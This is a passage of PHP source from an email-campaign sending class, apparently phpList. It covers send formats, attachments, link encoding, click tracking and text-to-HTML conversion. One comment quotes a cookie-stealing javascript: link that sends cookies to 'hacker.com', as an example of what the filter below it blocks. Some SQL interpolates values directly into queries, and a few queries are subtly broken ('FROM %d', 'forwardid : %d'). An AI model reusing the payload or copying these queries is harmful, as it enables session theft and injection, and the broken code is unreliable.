            #$textcampaign = $plugin->parseOutgoingTextCampaign($campaign->id,$textcampaign,$destinationemail, $subscriberdata);
            #$htmlcampaign = $plugin->parseOutgoingHTMLCampaign($campaign->id,$htmlcampaign,$destinationemail, $subscriberdata);
            $plugin_attachments = $plugin->getCampaignAttachment($campaign->id, $mail->Body);
            if (!empty($plugin_attachments[0]['content'])) {
                foreach ($plugins_attachments as $plugin_attachment) {
                    $mail->add_attachment(
                        $plugin_attachment['content'],
                        basename($plugin_attachment['filename']),
                        $plugin_attachment['mimetype']
                    );
                }
            }
        }*/

        # so what do we actually send?
        switch ($cached_campaign->sendformat) {
            case "PDF":
                # send a PDF file to subscribers who want html and text to everyone else
                /*TODO: enable plugins
                foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
                    $plugin->processSuccesFailure($campaign->id, 'astext', $subscriberdata);
                }*/
                if ($subscriber->htmlemail) {
                    if (!$is_test_mail){
                        $campaign->aspdf += 1;
                        $campaign->update();
                    }
                    $pdffile = PrepareCampaign::createPdf($textcampaign);
                    if (is_file($pdffile) && filesize($pdffile)) {
                        $fp = fopen($pdffile, "r");
                        if ($fp) {
                            $contents = fread($fp, filesize($pdffile));
                            fclose($fp);
                            unlink($pdffile);
                            $html = '<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
              <html>
              <head>
                <title></title>
              </head>
              <body>
              <embed src="campaign.pdf" width="450" height="450" href="campaign.pdf"></embed>
              </body>
              </html>';
                            #$mail->add_html($html,$textcampaign);
                            #$mail->add_text($textcampaign);
                            $mail->add_attachment(
                                $contents,
                                "campaign.pdf",
                                "application/pdf"
                            );
                        }
                    }
                    PrepareCampaign::addAttachments($campaign, $mail, "HTML");
                } else {
                    if (!$is_test_mail)
                        phpList::DB()->query(
                            "UPDATE {Config::getTableName('campaign')} SET astext = astext + 1 WHERE id = $campaign->id"
                        );
                    $mail->add_text($textcampaign);
                    PrepareCampaign::addAttachments($campaign, $mail, "text");
                }
                break;
            case "text and PDF":
                /*TODO: enable plugins
                foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
                    $plugin->processSuccesFailure($campaign->id, 'astext', $subscriberdata);
                }*/
                # send a PDF file to subscribers who want html and text to everyone else
                if ($subscriber->htmlemail) {
                    if (!$is_test_mail)
                        phpList::DB()->query(
                            "UPDATE {Config::getTableName('campaign')} SET astextandpdf = astextandpdf + 1 WHERE id = $campaign->id"
                        );
                    $pdffile = createPdf($textcampaign);
                    if (is_file($pdffile) && filesize($pdffile)) {
                        $fp = fopen($pdffile, "r");
                        if ($fp) {
                            $contents = fread($fp, filesize($pdffile));
                            fclose($fp);
                            unlink($pdffile);
                            $html = '<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
              <html>
              <head>
                <title></title>
              </head>
              <body>
              <embed src="campaign.pdf" width="450" height="450" href="campaign.pdf"></embed>
              </body>
              </html>';
                            #           $mail->add_html($html,$textcampaign);
                            $mail->add_text($textcampaign);
                            $mail->add_attachment(
                                $contents,
                                "campaign.pdf",
                                "application/pdf"
                            );
                        }
                    }
                    PrepareCampaign::addAttachments($campaign, $mail, "HTML");
                } else {
                    if (!$is_test_mail)
                        phpList::DB()->query(
                            "UPDATE {Config::getTableName('message')} SET astext = astext + 1 WHERE id = $campaign->id"
                        );
                    $mail->add_text($textcampaign);
                    PrepareCampaign::addAttachments($campaign, $mail, "text");
                }
                break;
            case "text":
                # send as text
                /*TODO: enable plugins
                foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
                    $plugin->processSuccesFailure($campaign->id, 'astext', $subscriberdata);
                }*/
                if (!$is_test_mail)
                    phpList::DB()->query("UPDATE {Config::getTableName('message')} SET astext = astext + 1 WHERE id = $campaign->id");
                $mail->add_text($textcampaign);
                PrepareCampaign::addAttachments($campaign, $mail, "text");
                break;
            case "both":
            case "text and HTML":
            case "HTML":
            default:
                $handled_by_plugin = 0;
                /*TODO: enable plugins
                if (!empty($GLOBALS['pluginsendformats'][$cached_campaign->sendformat])) {
                    # possibly handled by plugin
                    $pl = $GLOBALS['plugins'][$GLOBALS['pluginsendformats'][$cached_campaign->sendformat]];
                    if (is_object($pl) && method_exists($pl, 'parseFinalCampaign')) {
                        $handled_by_plugin = $pl->parseFinalCampaign(
                            $cached_campaign->sendformat,
                            $htmlcampaign,
                            $textcampaign,
                            $mail,
                            $campaign->id
                        );
                    }
                }
                */
                if (!$handled_by_plugin) {
                    # send one big file to subscribers who want html and text to everyone else
                    if ($subscriber->htmlemail) {
                        if (!$is_test_mail)
                            phpList::DB()->query(
                                "update {Config::getTableName('message')} set astextandhtml = astextandhtml + 1 where id = $campaign->id"
                            );
                        /*TODO: enable plugins
                        foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
                            $plugin->processSuccesFailure($campaign->id, 'ashtml', $subscriberdata);
                        }*/
                        #  dbg("Adding HTML ".$cached->templateid);
                        if (Config::WORDWRAP_HTML) {
                            ## wrap it: http://mantis.phplist.com/view.php?id=15528
                            ## some reports say, this fixes things and others say it breaks things https://mantis.phplist.com/view.php?id=15617
                            ## so for now, only switch on if requested.
                            ## it probably has to do with the MTA used
                            $htmlcampaign = wordwrap($htmlcampaign, Config::WORDWRAP_HTML, "\r\n");
                        }
                        $mail->add_html($htmlcampaign, $textcampaign, $cached_campaign->templateid);
                        PrepareCampaign::addAttachments($campaign, $mail, "HTML");
                    } else {
                        if (!$is_test_mail)
                            phpList::DB()->query(
                                "UPDATE {Config::getTableName('message')} SET astext = astext + 1 WHERE id = $campaign->id"
                            );
                        /*TODO: enable plugins
                        foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
                            $plugin->processSuccesFailure($campaign->id, 'astext', $subscriberdata);
                        }*/
                        $mail->add_text($textcampaign);
                        #$mail->setText($textcampaign);
                        #$mail->Encoding = TEXTEMAIL_ENCODING;
                        PrepareCampaign::addAttachments($campaign, $mail, "text");
                    }
                }
                break;
        }
        #print htmlspecialchars($htmlcampaign);exit;

        if (!Config::TEST) {
            if ($subscriber->uniqid != 'forwarded' || !sizeof($forwardedby)) {
                $fromname = $cached_campaign->fromname;
                $fromemail = $cached_campaign->fromemail;
                $subject = $cached_campaign->subject;
            } else {
                $fromname = '';
                $fromemail = $forwardedby['email'];
                $subject = s('Fwd') . ': ' . $cached_campaign->subject;
            }

            if (!empty($cached_campaign->replytoemail)) {
                $mail->AddReplyTo($cached_campaign->replytoemail, $cached_campaign->replytoname);
            }
            if ($get_speed_stats) Output::output('build End ' . Timer::get('PQT')->interval(1));
            if ($get_speed_stats) Output::output('send Start ' . Timer::get('PQT')->interval(1));

            if (Config::DEBUG) {
                $destinationemail = Config::DEVELOPER_EMAIL;
            }

            if (!$mail->compatSend('', $destinationemail, $fromname, $fromemail, $subject)) {
            #if (!$mail->send(array($destinationemail),'spool')) {
                /*TODO: enable plugins
                foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
                    $plugin->processSendFailed($campaign->id, $subscriberdata, $isTestMail);
                }*/
                Output::output(
                    sprintf(
                        s('Error sending campaign %d (%d/%d) to %s (%s) '),
                        $campaign->id,
                        /*$counters['batch_count'],
                        $counters['batch_total'],*/
                        0,0, //TODO: find solution to get counters from CampaignQueue
                        $subscriber->getEmail(),
                        $destinationemail
                    ),
                    0
                );
                return false;
            } else {
                ## only save the estimated size of the campaign when sending a test campaign
                if ($get_speed_stats) Output::output('send End ' . Timer::get('PQT')->interval(1));
                //TODO: find solution for send process id global var which currently is definded in CampaignQueue
                if (!isset($GLOBALS['send_process_id'])) {
                    if (!empty($mail->mailsize)) {
                        $name = $subscriber->htmlemail ? 'htmlsize' : 'textsize';
                        $campaign->setDataItem($name, $mail->mailsize);
                    }
                }
                $sqlCount = phpList::DB()->getQueryCount() - $sql_count_start;
                if ($get_speed_stats) Output::output('It took ' . $sqlCount . '  queries to send this campaign');
                /*TODO:enable plugins
                foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
                    $plugin->processSendSuccess($campaign->id, $subscriberdata, $isTestMail);
                }*/
                #   logEvent("Sent campaign $campaign->id to $subscriber->getEmail() ($destinationemail)");
                return true;
            }
        }
        return false;
    }

    /**
     * @param Campaign $campaign
     * @param phpListMailer $mail
     * @param string $type
     */
    private static function addAttachments($campaign, &$mail, $type)
    {
        if (Config::ALLOW_ATTACHMENTS) {
            $attachments = $campaign->getAttachments();
            //if (empty($attachments))
            //    return;
            if ($type == "text") {
                $mail->append_text(s('This campaign contains attachments that can be viewed with a webbrowser:') . "\n");
            }

            /**
             * @var Attachment $attachment
             */
            foreach ($attachments as $attachment) {
                $file = Config::ATTACHMENT_REPOSITORY . '/' . $attachment->filename;
                switch ($type) {
                    case "HTML":
                        if (is_file($file) && filesize($file)) {
                            $fp = fopen($file, "r");
                            if ($fp) {
                                $contents = fread($fp, filesize($file));
                                fclose($fp);
                                $mail->add_attachment(
                                    $contents,
                                    basename($attachment->remotefile),
                                    $attachment->mimetype
                                );
                            }
                        } elseif (is_file($attachment->remotefile) && filesize($attachment->remotefile)) {
                            # handle local filesystem attachments
                            $fp = fopen($attachment->remotefile, 'r');
                            if ($fp) {
                                $contents = fread($fp, filesize($attachment->remotefile));
                                fclose($fp);
                                $mail->add_attachment(
                                    $contents,
                                    basename($attachment->remotefile),
                                    $attachment->mimetype
                                );
                                list($name, $ext) = explode('.', basename($attachment->remotefile));
                                # create a temporary file to make sure to use a unique file name to store with
                                $newfile = tempnam(Config::ATTACHMENT_REPOSITORY, $name);
                                $newfile .= "." . $ext;
                                $newfile = basename($newfile);
                                $fd = fopen(Config::ATTACHMENT_REPOSITORY . '/' . $newfile, 'w');
                                fwrite($fd, $contents);
                                fclose($fd);
                                # check that it was successful
                                if (filesize(Config::ATTACHMENT_REPOSITORY . '/' . $newfile)) {
                                    $attachment->filename = $newfile;
                                    $attachment->update();
                                } else {
                                    # now this one could be sent many times, so send only once per run
                                    if (Config::get($attachment->remotefile . '_warned', false) === false) {
                                        Logger::logEvent(
                                            "Unable to make a copy of attachment {$attachment->remotefile} in repository"
                                        );
                                        $msg = sprintf(
                                            'Error, when trying to send campaign %d the filesystem attachment %s could not be copied to the repository. Check for permissions.',
                                            $campaign->id,
                                            $attachment->remotefile
                                        );
                                        phplistMailer::sendMail(Config::get('report_address'), 'Mail list error', $msg, '');
                                        Config::setRunningConfig($attachment->remotefile . '_warned', time());
                                    }
                                }
                            } else {
                                Logger::logEvent(
                                    "failed to open attachment {$attachment->remotefile} to add to campaign {$campaign->id}"
                                );
                            }
                        } else {
                            Logger::logEvent("Attachment {$attachment->remotefile} does not exist");
                            $msg = "Error, when trying to send campaign {$campaign->id} the attachment {$attachment->remotefile} could not be found";
                            phpListMailer::sendMail(Config::get('report_address'), 'Mail list error', $msg, '');
                        }
                        break;

                    case "text":
                        $viewurl = Config::get('public_scheme') . "://" . Config::get('website') . Config::PAGEROOT . '/dl.php?id=' . $attachment->id;
                        $mail->append_text(
                            $attachment->description . "\n" . s('Location') . ": " . $viewurl . "\n"
                        );
                        break;
                }
            }
        }
    }

    private static function createPDF($text)
    {
        if (Config::get('pdf_font', false) !== false) {
            Config::setRunningConfig('pdf_font', 'Arial');
            Config::setRunningConfig('pdf_fontsize', 12);
        }
        $pdf = new FPDF();
        $pdf->SetCreator('PHPlist version ' . Config::VERSION);
        $pdf->Open();
        $pdf->AliasNbPages();
        $pdf->AddPage();
        $pdf->SetFont(Config::get('pdf_font'), Config::get('pdf_fontstyle'), Config::get('pdf_fontsize'));
        $pdf->Write((int)Config::get('pdf_fontsize') / 2, $text);
        $fname = tempnam(Config::get('tmpdir'), 'pdf');
        $pdf->Output($fname, false);
        return $fname;
    }

    public static function mailto2href($text)
    {
        # converts <mailto:blabla> link to <a href="blabla"> links
        #~Bas 0008857
        $text = preg_replace(
            '/(.*@.*\..*) *<mailto:(\\1[^>]*)>/Umis',
            "[URLTEXT]\\1[ENDURLTEXT][LINK]\\2[ENDLINK]\n",
            $text
        );
        $text = preg_replace(
            '/<mailto:(.*@.*\..*)(\?.*)?>/Umis',
            "[URLTEXT]\\1[ENDURLTEXT][LINK]\\1\\2[ENDLINK]\n",
            $text
        );
        $text = preg_replace(
            '/\[URLTEXT\](.*)\[ENDURLTEXT\]\[LINK\](.*)\[ENDLINK\]/Umis',
            '<a href="mailto:\\2">\\1</a>',
            $text
        );
        return $text;
    }

    public static function linkEncode($p_url)
    {
        # URL Encode only the 'variable' parts of links, not the slashes in the path or the @ in an email address
        # from http://ar.php.net/manual/nl/function.rawurlencode.php
        # improved to handle mailto links properly
        #~Bas 0008857

        $uparts = @parse_url($p_url);

        $scheme = array_key_exists('scheme', $uparts) ? $uparts['scheme'] : "";
        $pass = array_key_exists('pass', $uparts) ? $uparts['pass'] : "";
        $subscriber = array_key_exists('user', $uparts) ? $uparts['user'] : "";
        $port = array_key_exists('port', $uparts) ? $uparts['port'] : "";
        $host = array_key_exists('host', $uparts) ? $uparts['host'] : "";
        $path = array_key_exists('path', $uparts) ? $uparts['path'] : "";
        $query = array_key_exists('query', $uparts) ? $uparts['query'] : "";
        $fragment = array_key_exists('fragment', $uparts) ? $uparts['fragment'] : "";

        if (!empty($scheme))
            if ($scheme == "mailto") {
                $scheme .= ':';
            } else {
                $scheme .= '://';
            };

        if (!empty($pass) && !empty($subscriber)) {
            $subscriber = rawurlencode($subscriber) . ':';
            $pass = rawurlencode($pass) . '@';
        } elseif (!empty($subscriber))
            $subscriber .= '@';

        if (!empty($port) && !empty($host))
            $host = '' . $host . ':';
        /*elseif (!empty($host))
            $host = $host;*/

        if (!empty($path)) {
            $arr = preg_split("/([\/;=@])/", $path, -1, PREG_SPLIT_DELIM_CAPTURE); // needs php > 4.0.5.
            $path = "";
            foreach ($arr as $var) {
                switch ($var) {
                    case "/":
                    case ";":
                    case "=":
                    case "@":
                        $path .= $var;
                        break;
                    default:
                        $path .= rawurlencode($var);
                }
            }
            // legacy patch for servers that need a literal /~username
            $path = str_replace("/%7E", "/~", $path);
        }

        if (!empty($query)) {
            $arr = preg_split("/([&=])/", $query, -1, PREG_SPLIT_DELIM_CAPTURE); // needs php > 4.0.5.
            $query = "?";
            foreach ($arr as $var) {
                if ("&" == $var || "=" == $var)
                    $query .= $var;
                else
                    $query .= rawurlencode($var);
            }
        }

        if (!empty($fragment))
            $fragment = '#' . urlencode($fragment);

        return implode('', array($scheme, $subscriber, $pass, $host, $port, $path, $query, $fragment));
    }

    public static function encodeLinks($text)
    {
        #~Bas Find and properly encode all links.
        preg_match_all("/<a(.*)href=[\"\'](.*)[\"\']([^>]*)>/Umis", $text, $links);

        foreach ($links[0] as $matchindex => $fullmatch) {
            $linkurl = $links[2][$matchindex];
            $linkreplace = '<a' . $links[1][$matchindex] . ' href="' . PrepareCampaign::linkEncode(
                    $linkurl
                ) . '"' . $links[3][$matchindex] . '>';
            $text = str_replace($fullmatch, $linkreplace, $text);
        }
        return $text;
    }

    public static function clickTrackLinkId($campaign_id, $subscriberid, $url, $link)
    {
        $cache = Cache::instance();
        if (!isset($cache->linktrack_cache[$link])) {
            $exists = phpList::DB()->fetchRowQuery(sprintf(
                    'SELECT id FROM %d
                    WHERE url = "%s"',
                    Config::getTableName('linktrack_forward'),
                    $url
                ));
            if (!$exists[0]) {
                $personalise = preg_match('/uid=/', $link);
                phpList::DB()->query(sprintf(
                        'INSERT INTO %s (url, personalise)
                        VALUES("%s", "%s")',
                        Config::getTableName('linktrack_forward'),
                        $url,
                        $personalise
                    ));
                $fwdid = phpList::DB()->insertedId();
            } else {
                $fwdid = $exists[0];
            }
            $cache->linktrack_cache[$link] = $fwdid;
        } else {
            $fwdid = $cache->linktrack_cache[$link];
        }
        
        if (!isset($cache->linktrack_sent_cache[$campaign_id]) || !is_array($cache->linktrack_sent_cache[$campaign_id])){
            $cache->linktrack_sent_cache[$campaign_id] = array();
        }
        if (!isset($cache->linktrack_sent_cache[$campaign_id][$fwdid])) {
            $rs = phpList::DB()->query(sprintf(
                    'SELECT total FROM %s
                    WHERE messageid = %d
                    AND forwardid : %d',
                    Config::getTableName('linktrack_ml'),
                    $campaign_id,
                    $fwdid
                ));
            if (!phpList::DB()->numRows($rs)) {
                $total = 1;
                ## first time for this link/campaign
                # BCD: Isn't this just an insert?
                phpList::DB()->query(sprintf(
                        'REPLACE INTO %s (total, messageid, forwardid)
                        VALUES(%d, %d, %d)',
                        Config::getTableName('linktrack_ml'),
                        $total,
                        $campaign_id,
                        $fwdid
                    ));
            } else {
                $tot = phpList::DB()->fetchRow($rs);
                $total = $tot[0] + 1;
                phpList::DB()->query(sprintf(
                        'UPDATE %s SET total = %d
                        WHERE messageid = %d
                        AND forwardid = %d',
                        Config::getTableName('linktrack_ml'),
                        $total,
                        $campaign_id,
                        $fwdid
                ));
            }
            $cache->linktrack_sent_cache[$campaign_id][$fwdid] = $total;
        } else {
            $cache->linktrack_sent_cache[$campaign_id][$fwdid]++;
            ## write every so often, to make sure it's saved when interrupted
            if ($cache->linktrack_sent_cache[$campaign_id][$fwdid] % 100 == 0) {
                phpList::DB()->query(sprintf(
                        'UPDATE %s SET total = %d
                        WHERE messageid = %d
                        AND forwardid = %d',
                        Config::getTableName('linktrack_ml'),
                        $cache->linktrack_sent_cache[$campaign_id][$fwdid],
                        $campaign_id,
                        $fwdid
                ));
            }
        }

        /*  $req = Sql_Query(sprintf('insert ignore into %s (messageid,userid,forwardid)
            values(%d,%d,"%s","%s")',Config::getTableName('linktrack'),$campaign_id,$subscriberdata['id'],$url,addslashes($link)));
          $req = Sql_Fetch_Row_Query(sprintf('select linkid from %s where messageid = %s and userid = %d and forwardid = %d
          ',Config::getTableName('linktrack'),$campaign_id,$subscriberid,$fwdid));*/
        return $fwdid;
    }

    private static function parsePlaceHolders($content, $array = array())
    {
        ## the editor turns all non-ascii chars into the html equivalent so do that as well
        foreach ($array as $key => $val) {
            $array[strtoupper($key)] = $val;
            $array[htmlentities(strtoupper($key), ENT_QUOTES, 'UTF-8')] = $val;
            $array[str_ireplace(' ', '&nbsp;', strtoupper($key))] = $val;
        }

        foreach ($array as $key => $val) {
            //Only using PHP5 now
            //if (PHP5) { ## the help only lists attributes with strlen($name) < 20
                #  print '<br/>'.$key.' '.$val.'<hr/>'.htmlspecialchars($content).'<hr/>';
                if (stripos($content, '[' . $key . ']') !== false) {
                    $content = str_ireplace('[' . $key . ']', $val, $content);
                }
                if (preg_match('/\[' . $key . '%%([^\]]+)\]/i', $content, $regs)) { ## @@todo, check for quoting */ etc
                    #    var_dump($regs);
                    if (!empty($val)) {
                        $content = str_ireplace($regs[0], $val, $content);
                    } else {
                        $content = str_ireplace($regs[0], $regs[1], $content);
                    }
                }
            /*} else {
                $key = str_replace('/', '\/', $key);
                if (preg_match('/\[' . $key . '\]/i', $content, $match)) {
                    $content = str_replace($match[0], $val, $content);
                }
            }*/
        }
        return $content;
    }


    private static function parseText($text) {
        # bug in PHP? get rid of newlines at the beginning of text
        $text = ltrim($text);

        # make urls and emails clickable
        $text = preg_replace("/([\._a-z0-9-]+@[\.a-z0-9-]+)/i",'<a href="mailto:\\1" class="email">\\1</a>',$text);
        $link_pattern="/(.*)<a.*href\s*=\s*\"(.*?)\"\s*(.*?)>(.*?)<\s*\/a\s*>(.*)/is";

        $i=0;
        $link = array();
        while (preg_match($link_pattern, $text, $matches)){
            $url=$matches[2];
            $rest = $matches[3];
            if (!preg_match("/^(http:)|(mailto:)|(ftp:)|(https:)/i",$url)){
                # avoid this
                #<a href="javascript:window.open('http://hacker.com?cookie='+document.cookie)">
                $url = preg_replace("/:/","",$url);
            }
            $link[$i]= '<a href="'.$url.'" '.$rest.'>'.$matches[4].'</a>';
            $text = $matches[1]."%%$i%%".$matches[5];
            $i++;
        }

        $text = preg_replace('/(www\.[a-zA-Z0-9\.\/#~:?+=&%@!_\\-]+)/i', 'http://\\1', $text);#make www. -> http://www.
        $text = preg_replace('/(https?:\/\/)http?:\/\//i', '\\1', $text);#take out duplicate schema
        $text = preg_replace('/(ftp:\/\/)http?:\/\//i', '\\1', $text);#take out duplicate schema
        $text = preg_replace(
            '/(https?:\/\/)(?!www)([a-zA-Z0-9\.\/#~:?+=&%@!_\\-]+)/i',
            '<a href="\\1\\2" class="url" target="_blank">\\2</a>',
            $text
        ); #eg-- http://kernel.org -> <a href"http://kernel.org" target="_blank">http://kernel.org</a>

        $text = preg_replace(
            '/(https?:\/\/)(www\.)([a-zA-Z0-9\.\/#~:?+=&%@!\\-_]+)/i',
            '<a href="\\1\\2\\3" class="url" target="_blank">\\2\\3</a>',
            $text
        ); #eg -- http://www.google.com -> <a href"http://www.google.com" target="_blank">www.google.com</a>

        # take off a possible last full stop and move it outside
        $text = preg_replace(
            '/<a href="(.*?)\." class="url" target="_blank">(.*)\.<\/a>/i',
            '<a href="\\1" class="url" target="_blank">\\2</a>.',
            $text
        );

        for ($j = 0;$j<$i;$j++) {
            $replacement = $link[$j];
            $text = preg_replace('/\%\%$j\%\%/',$replacement, $text);
        }

        # hmm, regular expression choke on some characters in the text
        # first replace all the brackets with placeholders.
        # we cannot use htmlspecialchars or addslashes, because some are needed

        $text = str_replace('\(','<!--LB-->',$text);
        $text = str_replace('\)','<!--RB-->',$text);
        $text = preg_replace('/\$/','<!--DOLL-->',$text);

        # @@@ to be xhtml compabible we'd have to close the <p> as well
        # so for now, just make it two br/s, which will be done by replacing
        # \n with <br/>
        # $paragraph = '<p class="x">';
        $br = '<br />';
        $text = preg_replace("/\r/",'',$text);
        $text = preg_replace("/\n/","$br\n",$text);

        # reverse our previous placeholders
        $text = str_replace('<!--LB-->','(',$text);
        $text = str_replace('<!--RB-->',')',$text);
        $text = str_replace('<!--DOLL-->','\$',$text);
        return $text;
    }

    /**
     * Add the footer
     * @param string $campaign
     * @param string $footer
     * @return string
     */
    private static function addHTMLFooter($campaign,$footer) {
        if (preg_match('#</body>#imUx',$campaign)) {
            $campaign = preg_replace('#</body>#',$footer.'</body>',$campaign);
        } else {
            $campaign .= $footer;
        }
        return $campaign;
    }

    /**
     * Load campaign in memory cache
     * @param Campaign $campaign
     * @param bool $forwardContent
     * @return bool
     */
    public static function precacheCampaign($campaign, $forwardContent = false)
    {
        $domain = Config::get('domain');
        /**
         * @var Campaign $cached_campaign
         */
        $cached_campaign = &Cache::getCachedCampaign($campaign);

        ## the reply to is actually not in use
        if (preg_match('/([^ ]+@[^ ]+)/', $campaign->replyto, $regs)) {
            # if there is an email in the from, rewrite it as "name <email>"
            $campaign->replyto = str_replace($regs[0], '', $campaign->replyto);
            $cached_campaign->replytoemail = $regs[0];
            # if the email has < and > take them out here
            $cached_campaign->replytoemail = str_replace(array('<', '>'), '', $cached_campaign->replytoemail);
            //$cached->replytoemail = str_replace('>', '', $cached->replytoemail);
            # make sure there are no quotes around the name
            $cached_campaign->replytoname = str_replace('"', '', ltrim(rtrim($campaign->replyto)));
        } elseif (strpos($campaign->replyto, ' ')) {
            # if there is a space, we need to add the email
            $cached_campaign->replytoname = $campaign->replyto;
            $cached_campaign->replytoemail = "listmaster@$domain";
        } else {
            if (!empty($campaign->replyto)) {
                $cached_campaign->replytoemail = "{$campaign->replyto}@$domain";

                ## makes more sense not to add the domain to the word, but the help says it does
                ## so let's keep it for now
                $cached_campaign->replytoname = "{$campaign->replyto}@$domain";
            }
        }

        //$cached_campaign->fromname = $campaign->fromname;
        //$cached_campaign->fromemail = $campaign->fromemail;
        $cached_campaign->to = $campaign->tofield;
        #0013076: different content when forwarding 'to a friend'
        $cached_campaign->subject = $forwardContent ? stripslashes($campaign->forwardsubject) : $campaign->subject;
        #0013076: different content when forwarding 'to a friend'
        $cached_campaign->content = $forwardContent ? stripslashes($campaign->forwardcampaign) : $campaign->campaign;
        if (Config::USE_MANUAL_TEXT_PART && !$forwardContent) {
            $cached_campaign->textcontent = $campaign->textcampaign;
        } else {
            $cached_campaign->textcontent = '';
        }
        #var_dump($cached);exit;
        #0013076: different content when forwarding 'to a friend'
        $cached_campaign->footer = $forwardContent ? stripslashes($campaign->forwardfooter) : $campaign->footer;

        if (strip_tags($cached_campaign->footer) != $cached_campaign->footer) {
            $cached_campaign->textfooter = String::HTML2Text($cached_campaign->footer);
            $cached_campaign->htmlfooter = $cached_campaign->footer;
        } else {
            $cached_campaign->textfooter = $cached_campaign->footer;
            $cached_campaign->htmlfooter = PrepareCampaign::parseText($cached_campaign->footer);
        }

        $cached_campaign->htmlformatted = (strip_tags($cached_campaign->content) != $cached_campaign->content);
        //$cached_campaign->sendformat = $campaign->sendformat;

        ## @@ put this here, so it can become editable per email sent out at a later stage
        $cached_campaign->html_charset = 'UTF-8'; #Config::get('html_charset');
        ## @@ need to check on validity of charset
        /*if (!$cached_campaign->html_charset) {
            $cached_campaign->html_charset = 'UTF-8'; #'iso-8859-1';
        }*/
        $cached_campaign->text_charset = 'UTF-8'; #Config::get('text_charset');
        /*if (!$cached_campaign->text_charset) {
            $cached_campaign->text_charset = 'UTF-8'; #'iso-8859-1';
        }*/

        ## if we are sending a URL that contains subscriber attributes, we cannot pre-parse the campaign here
        ## but that has quite some impact on speed. So check if that's the case and apply
        $cached_campaign->subscriberspecific_url = preg_match('/\[.+\]/', $campaign->sendurl);

        if (!$cached_campaign->subscriberspecific_url) {
            ## Fetch external content here, because URL does not contain placeholders
            if (Config::get('canFetchUrl') && preg_match('/\[URL:([^\s]+)\]/i', $cached_campaign->content, $regs)) {
                $remote_content = Util::fetchUrl($regs[1]);
                #  $remote_content = fetchUrl($campaign['sendurl'],array());

                # @@ don't use this
                #      $remote_content = includeStyles($remote_content);

                if ($remote_content) {
                    $cached_campaign->content = str_replace(
                        $regs[0],
                        $remote_content,
                        $cached_campaign->content
                    );
                    #  $cached[$campaign_id]['content'] = $remote_content;
                    $cached_campaign->htmlformatted = strip_tags($remote_content) != $remote_content;
                } else {
                    #print Error(s('unable to fetch web page for sending'));
                    Logger::logEvent("Error fetching URL: " . $campaign->sendurl . ' cannot proceed');
                    return false;
                }
            }

            if (Config::VERBOSE && (Config::get('getspeedstats', false) !== false)) {
                Output::output('fetch URL end');
            }
            /*
            print $campaign->sendurl;
            print $remote_content;exit;
            */
        } // end if not subscriberspecific url


        /*if ($cached_campaign->htmlformatted) {
            #   $cached->content = String::compressContent($cached->content);
        }*/

        //$cached_campaign->google_track = $campaign->google_track;
        /*
            else {
        print $campaign->sendurl;
        exit;
        }
        */

        if (Config::VERBOSE && (Config::get('getspeedstats', false) !== false)) {
            Output::output('parse config start');
        }

        /*
         * this is not a good idea, as it'll replace eg "unsubscribeurl" with a general one instead of personalised
         *   if (is_array($GLOBALS['default_config'])) {
            foreach($GLOBALS['default_config'] as $key => $val) {
              if (is_array($val)) {
                $cached[$campaign_id]['content'] = str_ireplace("[$key]",Config::get($key),$cached[$campaign_id]['content']);
                $cached->textcontent = str_ireplace("[$key]",Config::get($key),$cached->textcontent);
                $cached->textfooter = str_ireplace("[$key]",Config::get($key),$cached[$campaign_id]['textfooter']);
                $cached->htmlfooter = str_ireplace("[$key]",Config::get($key),$cached[$campaign_id]['htmlfooter']);
              }
            }
          }
          */
        if (Config::VERBOSE && (Config::get('getspeedstats', false) !== false)) {
            Output::output('parse config end');
        }
        /*TODO: figure out what this does
        foreach ($campaign as $key => $val) {
            if (!is_array($val)) {
                $cached_campaign->content = str_ireplace("[$key]", $val, $cached_campaign->content);
                $cached_campaign->textcontent = str_ireplace("[$key]", $val, $cached_campaign->textcontent);
                $cached_campaign->textfooter = str_ireplace("[$key]", $val, $cached_campaign->textfooter);
                $cached_campaign->htmlfooter = str_ireplace("[$key]", $val, $cached_campaign->htmlfooter);
            }
        }*/
        if (preg_match("/##LISTOWNER=(.*)/", $cached_campaign->content, $regs)) {
            $cached_campaign->listowner = $regs[1];
            $cached_campaign->content = str_replace($regs[0], '', $cached_campaign->content);
        } else {
            $cached_campaign->listowner = 0;
        }

        if (!empty($cached_campaign->listowner)) {
            $att_req = phpList::DB()->query(sprintf(
                'SELECT name,value FROM %s AS aa, %s AS a_a
                WHERE aa.id = a_a.adminattributeid AND aa.adminid = %d'
                ,Config::getTableName('adminattribute'),
                Config::getTableName('admin_attribute'),
                $cached_campaign->listowner
            ));
            while ($att = phpList::DB()->fetchArray($att_req)) {
                $cached_campaign->content = preg_replace(
                    '#\[LISTOWNER.' . strtoupper(preg_quote($att['name'])) . '\]#',
                    $att['value'],
                    $cached_campaign->content
                );
            }
        }

        $baseurl = Config::get('website');
        if (Config::UPLOADIMAGES_DIR != null) {
            ## escape subdirectories, otherwise this renders empty
            $dir = str_replace('/', '\/', Config::UPLOADIMAGES_DIR);
            $cached_campaign->content = preg_replace(
                '/<img(.*)src="\/' . $dir . '(.*)>/iU',
                '<img\\1src="' . Config::get('public_scheme') . '://' . $baseurl . '/' . Config::UPLOADIMAGES_DIR . '\\2>',
                $cached_campaign->content
            );
        }
        //if (defined('FCKIMAGES_DIR') && FCKIMAGES_DIR) {
        //$cached[$campaign_id]['content'] = preg_replace('/<img(.*)src="\/lists\/'.FCKIMAGES_DIR.'(.*)>/iU','<img\\1src="'.$GLOBALS['public_scheme'].'://'.$baseurl.'/lists/'.FCKIMAGES_DIR.'\\2>',$cached[$campaign_id]['content']);
        //}
        return true;
    }


    /* TODO
    # make sure the 0 template has the powered by image
    $query
    = ' select *'
    . ' from %s'
    . ' where filename = ?'
    . '   and template = 0';
    $query = sprintf($query, Config::getTableName('templateimage'));
    $rs = Sql_Query_Params($query, array('powerphplist.png'));
    if (!Sql_Num_Rows($rs)) {
    $query
    = ' insert into %s'
    . '   (template, mimetype, filename, data, width, height)'
    . ' values (0, ?, ?, ?, ?, ?)';
    $query = sprintf($query, Config::getTableName('templateimage'));
